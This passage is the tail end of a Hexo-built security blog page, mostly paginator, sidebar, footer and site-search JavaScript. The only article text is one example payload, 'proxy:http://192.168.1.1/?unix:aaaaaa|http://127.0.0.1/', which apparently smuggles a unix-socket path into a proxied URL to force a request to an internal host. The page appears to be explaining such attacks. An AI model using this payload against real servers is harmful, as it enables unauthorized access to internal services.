<p>比如这样的<code>proxy:http://192.168.1.1/?unix:aaaaaa|http://127.0.0.1/</code></p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">139</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">79</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>